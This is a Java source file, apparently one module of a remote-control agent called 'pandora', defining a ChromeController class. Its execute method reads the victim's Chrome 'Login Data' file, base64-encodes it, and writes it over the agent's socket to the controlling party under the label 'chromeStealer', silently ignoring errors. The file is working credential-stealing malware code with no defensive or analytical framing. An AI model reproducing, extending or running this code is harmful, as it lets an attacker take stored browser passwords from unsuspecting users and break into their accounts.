package org.pandora.agent.control.impl;

import org.pandora.agent.Client;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

public class ChromeController {

    private final Client client;

    public ChromeController(final Client client) {
        this.client = client;
    }

    public void execute(final String requestId) {
        final File file = new File(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data");
        String result = "An error occurred";
        try {
            final FileInputStream fileInputStream = new FileInputStream(file);
            final byte[] data = new byte[(int) file.length()];
            fileInputStream.read(data);
            fileInputStream.close();
            result = Base64.getEncoder().encodeToString(data);
        } catch (final IOException ignore) {
        }
        this.client.getSocketUtils().write("chromeStealer:" + requestId + ":" + result);
    }
}